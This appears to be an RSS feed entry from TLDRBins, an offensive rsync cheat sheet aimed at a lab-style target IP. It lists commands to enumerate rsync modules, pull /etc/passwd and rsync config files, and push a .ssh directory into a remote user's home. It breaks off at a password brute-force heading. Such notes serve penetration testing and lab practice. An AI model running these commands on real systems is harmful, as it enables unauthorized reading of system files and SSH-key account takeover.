channel.title: Rsync on TLDRBins
channel.description: Recent content in Rsync on TLDRBins

item.title: rsync
item.description: Basic Commands # List directory ('/') rsync --list-only -a rsync://10.10.11.10/ # List directory ('/') with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/ # List a file rsync --list-only -a rsync://10.10.11.10/etc/passwd # List files (wildcard) rsync --list-only -a rsync://10.10.11.10/etc/rsync* # Get a file rsync -a rsync://10.10.11.10/etc/passwd . # Get files (wildcard) rsync -a rsync://10.10.11.10/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=<PASSWORD>; rsync -aR .ssh/ rsync://<USER>@10.10.11.10/home_user/ Bruteforce rsync password # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.
